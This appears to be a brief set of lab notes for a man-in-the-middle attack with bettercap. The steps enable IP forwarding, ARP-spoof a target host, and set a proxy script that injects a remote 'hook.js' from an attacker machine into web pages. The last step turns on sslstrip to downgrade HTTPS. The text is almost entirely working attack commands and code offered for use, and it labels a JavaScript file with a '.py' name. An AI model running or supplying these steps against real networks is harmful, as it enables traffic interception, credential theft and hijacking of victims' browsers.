Perform ARP spoofing attack:

	sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

	sudo bettercap
	set arp.spoof.targets 10.0.2.4
	set arp.spoof.fullduplex true
	arp.spoof on

Create a script:

	nano myscript.py

	function onResponse(req, res) {
	    if( res.ContentType.indexOf('text/html') == 0 ){
	        var body = res.ReadBody();
	        if( body.indexOf('</head>') != -1 ) {
	            res.Body = body.replace( 
	                '</head>', 
	                '<script type="text/javascript" src="http://hackbox:3000/hook.js"></script></head>' 
	            );
	        }
	    }
	}

Inject the script on the proxy:

	set http.proxy.script /home/user/Desktop/myscript.py
	set http.proxy.sslstrip true
http.proxy on